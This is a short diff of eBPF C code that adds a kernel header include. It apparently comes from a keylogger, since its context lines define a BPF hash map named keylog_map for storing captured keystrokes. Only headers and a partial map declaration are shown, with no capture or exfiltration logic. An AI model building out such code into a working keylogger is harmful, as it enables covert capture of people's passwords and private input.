@@ -1,7 +1,7 @@
 #include <linux/bpf.h>
 #include <linux/ptrace.h>
 #include <linux/unistd.h>
-
+#include <linux/sched.h>
 // macros for defining a map t store keylogs 
 struct bpf_map_def SEC("maps") keylog_map = {
     .type = BPF_MAP_TYPE_HASH,
